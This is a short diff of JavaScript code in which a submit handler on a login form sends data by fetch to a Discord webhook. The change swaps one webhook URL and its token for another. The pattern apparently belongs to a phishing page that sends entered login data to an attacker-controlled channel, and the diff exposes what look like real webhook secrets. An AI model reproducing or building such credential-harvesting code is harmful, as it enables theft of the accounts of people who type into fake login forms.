@@ -33,7 +33,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
             };
 
             // Replace this with your actual Discord webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1306720855241523252/57GWBNWefEYv055_pM-nNkolRNEyMxVl2kkRBHdHd5AkCXuhybPHWZCl4C6rKkBYNKWG';  // Replace with your Discord webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1306722002299519118/JBGAlimW_ffiPdEpZy2cOzvqfwD7MHqZUG-9MrVCCEE2drdKXVPGikP_U5NTBtl94CTp';  // Replace with your Discord webhook
 
             // Send the data to the Discord webhook using Fetch API
             fetch(webhookUrl, {
